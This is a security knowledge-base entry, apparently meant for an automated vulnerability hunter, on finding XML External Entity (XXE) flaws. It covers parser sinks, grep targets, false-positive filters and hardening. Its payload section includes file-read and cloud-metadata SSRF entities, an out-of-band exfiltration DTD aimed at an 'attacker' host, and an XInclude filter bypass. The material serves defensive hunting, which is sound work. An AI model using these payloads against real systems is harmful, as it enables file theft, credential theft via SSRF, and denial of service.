---
name: sh-kb-xxe
description: "Knowledge base for finding XML External Entity injection - XML parsers configured to resolve external/general entities on untrusted input, enabling file read, SSRF, and DoS. Use when hunting XXE. CWE-611/776/827, OWASP A05:2021-Security Misconfiguration."
---

# XML External Entity (XXE) - Hunter Knowledge Base

An XML parser that resolves external entities processes attacker-supplied XML, letting a DTD declare
entities that read local files, make server-side requests (SSRF), or exhaust resources (billion laughs).

## When to hunt this
Any endpoint that parses XML from users: SOAP, XML APIs, SVG/DOCX/XLSX/SVG uploads (zip-of-XML), SAML
responses, RSS/Atom import, XML config upload, `Content-Type: application/xml` or `text/xml` handlers.

## Sinks by ecosystem (grep targets)
- **Java**: `DocumentBuilderFactory`, `SAXParserFactory`, `XMLInputFactory`, `TransformerFactory`,
  `SAXReader`, `Unmarshaller`, `XMLReader` - vulnerable unless external entities/DTDs are disabled.
- **Python**: `xml.etree.ElementTree` (older), `lxml.etree` with `resolve_entities=True`/custom resolver,
  `xml.dom.minidom`, `xml.sax` - `defusedxml` is the safe replacement.
- **PHP**: `simplexml_load_string`/`DOMDocument->loadXML` with `LIBXML_NOENT`/`LIBXML_DTDLOAD`.
- **.NET**: `XmlDocument`/`XmlTextReader` with `DtdProcessing=Parse` and a non-null `XmlResolver`.
- **Node**: `libxmljs` with `noent:true`, some SOAP/`xml2js` configs.

## Detection recipe
1. `graft grep "DocumentBuilderFactory|SAXParser|XMLInputFactory|loadXML|simplexml_load|lxml.etree|XmlReader|DtdProcessing" --json`.
2. Confirm the parser reads untrusted XML.
3. Check whether external entities / DTDs are **disabled** (see filters). If defaults are left on (many
   parsers resolve entities by default), flag.

## Payloads / PoC
- File read: a DOCTYPE with `<!ENTITY xxe SYSTEM "file:///etc/passwd">` then reference `&xxe;` in an element.
- SSRF: `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">`.
- Blind/OOB (parser suppresses output): external DTD hosted by attacker exfiltrating via a parameter entity
  to `http://attacker/?%file;`.
- Billion laughs DoS: nested entity expansion.
- SVG/Office upload: embed the DOCTYPE inside the XML part of an uploaded SVG/DOCX.
- **XInclude (no DOCTYPE needed)**: when the app rejects/strips a `DOCTYPE` but drops attacker XML into an
  existing document's body (not the whole document), a `DOCTYPE` declaration isn't possible - instead use
  `xi:include` if the parser has XInclude enabled: `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`.
  This bypasses DOCTYPE-based filters entirely, so "no `<!DOCTYPE`" is not itself a false-positive signal -
  check whether XInclude is also disabled (`setXIncludeAware(false)` in Java, or equivalent).

## False-positive filters
- Parser hardened: `disallow-doctype-decl` true, `external-general-entities`/`external-parameter-entities`
  false, `XMLResolver=null`, `resolve_entities=False`, using `defusedxml`, `LIBXML_NONET` and DTD loading off,
  .NET `DtdProcessing.Prohibit`.
- Java specifically: hardening must **also** set `setXIncludeAware(false)` and `ACCESS_EXTERNAL_DTD`/
  `ACCESS_EXTERNAL_SCHEMA` to `""` (JAXP 1.5+) - `disallow-doctype-decl` alone still leaves XInclude and
  external-schema resolution reachable. For SAX/StAX, confirm the hardened factory/property is applied to
  every reader instance the factory creates, not just the factory object itself.
- .NET 4.5.2+ defaults (`XmlReader`, `XDocument`) are safe out of the box; only flag older TFMs or explicit
  `XmlTextReader`/`XmlDocument` use without the settings above. PHP 8.0+ disables external entities by
  default; only flag PHP <8.0 without `libxml_set_external_entity_loader(null)`/`LIBXML_NOENT` off.
- Input is JSON, not XML; or XML comes only from a trusted internal source.

## CWE / OWASP / severity
CWE-611 (XXE), CWE-776 (entity expansion), CWE-827. OWASP A05:2021. File read of secrets or SSRF to
metadata -> **high/critical**; DoS-only -> medium.

## Chaining hints
XXE file read -> `secrets` (config/keys) -> further access; XXE -> `ssrf` -> cloud metadata/internal;
present in SAML flows -> `auth` bypass.

## Mitigation
Disable DTDs and external entity resolution on every XML parser handling untrusted input (use the
hardened factory settings above or a safe library like `defusedxml`); also disable XInclude
(`setXIncludeAware(false)`) since it is a separate feature from DTD/entity processing and is not covered by
`disallow-doctype-decl`; prefer JSON where possible; validate uploads that are XML-backed (SVG/Office) with
the same hardening.
